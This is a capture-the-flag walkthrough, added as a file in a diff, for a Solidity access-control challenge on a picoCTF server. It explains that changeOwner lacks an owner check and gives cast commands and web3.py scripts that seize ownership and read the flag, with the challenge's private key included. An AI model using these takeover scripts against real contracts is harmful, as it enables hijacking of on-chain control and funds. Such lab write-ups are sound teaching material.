@@ -1,0 +1,169 @@
+Access Control Challenge - Solution Walkthrough
+Vulnerability Analysis
+
+The contract has a critical vulnerability in the changeOwner function:
+solidity
+
+function changeOwner(address _newOwner) public {
+    address oldOwner = owner;
+    owner = _newOwner;
+    emit OwnerChanged(oldOwner, _newOwner);
+}
+
+Issue: There is no access control modifier (like require(msg.sender == owner)) to restrict who can call this function. Anyone can become the owner by simply calling this function with their own address.
+Step-by-Step Exploitation
+Step 1: Environment Setup
+
+First, install Foundry (if not already installed):
+bash
+
+foundryup
+
+The challenge provides:
+
+    Contract Address: 0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9
+
+    Private Key: 0x0230c5b326c0d10b182d1e47a7dc2c6c4c82883a9e42866766d8a5e9930842c0
+
+    Your Address: 0xd54Ad1b056cde127D02c9955C9F6e33B52f13Fcc
+
+    RPC URL: http://lonely-island.picoctf.net:60474
+
+Step 2: Check Current Owner
+
+Verify the current owner before exploitation:
+bash
+
+cast call 0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9 \
+    "owner()(address)" \
+    --rpc-url http://lonely-island.picoctf.net:60474
+
+Output: 0x09db0a93b389bef724429898f539aeb7ac2dd55f (original owner)
+Step 3: Become the Owner
+
+Since cast was having issues with the RPC server, we used Python with web3.py. First, set up a virtual environment:
+bash
+
+# Create and activate virtual environment
+python3 -m venv web3-env
+source web3-env/bin/activate
+
+# Install web3.py
+pip install web3
+
+Create exploit.py:
+python
+
+from web3 import Web3
+from eth_account import Account
+
+# Connect to the network
+w3 = Web3(Web3.HTTPProvider('http://lonely-island.picoctf.net:60474'))
+
+# Your private key and address
+private_key = '0x0230c5b326c0d10b182d1e47a7dc2c6c4c82883a9e42866766d8a5e9930842c0'
+account = Account.from_key(private_key)
+my_address = '0xd54Ad1b056cde127D02c9955C9F6e33B52f13Fcc'
+
+# Contract address
+contract_address = '0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9'
+
+# Function signature for changeOwner(address)
+function_selector = '0xa6f9dae1'
+address_param = my_address[2:].lower().rjust(64, '0')
+data = function_selector + address_param
+
+# Get nonce and chain ID
+nonce = w3.eth.get_transaction_count(my_address)
+chain_id = w3.eth.chain_id
+
+# Build and send transaction
+transaction = {
+    'to': contract_address,
+    'value': 0,
+    'gas': 100000,
+    'gasPrice': w3.to_wei('1', 'gwei'),
+    'nonce': nonce,
+    'data': data,
+    'chainId': chain_id
+}
+
+signed = account.sign_transaction(transaction)
+tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
+print(f"Transaction sent: {tx_hash.hex()}")
+
+# Wait for confirmation
+receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
+print(f"Status: {'Success' if receipt['status'] == 1 else 'Failed'}")
+
+Run it:
+bash
+
+python3 exploit.py
+
+Output:
+text
+
+Transaction sent: 3f6e644402235abb83efdf54189716291b745d70e1a61555f8443c98cc38bce6
+Status: Success
+
+Step 4: Verify Ownership Change
+bash
+
+cast call 0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9 \
+    "owner()(address)" \
+    --rpc-url http://lonely-island.picoctf.net:60474
+
+Output: 0xd54ad1b056cde127d02c9955c9f6e33b52f13fcc (now we are the owner!)
+Step 5: Reveal the Flag
+
+Now that we're the owner, call the solve() function. Create solve.py:
+python
+
+from web3 import Web3
+from eth_account import Account
+
+w3 = Web3(Web3.HTTPProvider('http://lonely-island.picoctf.net:60474'))
+
+private_key = '0x0230c5b326c0d10b182d1e47a7dc2c6c4c82883a9e42866766d8a5e9930842c0'
+account = Account.from_key(private_key)
+my_address = '0xd54Ad1b056cde127D02c9955C9F6e33B52f13Fcc'
+contract_address = '0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9'
+
+# Call solve()
+solve_data = '0x890d6908'  # solve() function signature
+nonce = w3.eth.get_transaction_count(my_address)
+chain_id = w3.eth.chain_id
+
+transaction = {
+    'to': contract_address,
+    'value': 0,
+    'gas': 100000,
+    'gasPrice': w3.to_wei('1', 'gwei'),
+    'nonce': nonce,
+    'data': solve_data,
+    'chainId': chain_id
+}
+
+signed = account.sign_transaction(transaction)
+tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
+receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
+
+# Get the flag
+flag_data = '0xf9633930'  # getFlag() function signature
+flag_result = w3.eth.call({
+    'to': contract_address,
+    'data': flag_data
+})
+
+# Decode the flag
+flag_hex = flag_result.hex()
+# Skip offset (32 bytes) and length (32 bytes)
+data_hex = flag_hex[128:]
+flag = bytes.fromhex(data_hex).decode('utf-8').rstrip('\x00')
+print(f"🏁 FLAG: {flag}")
+
+Run it:
+bash
+
+python3 solve.py
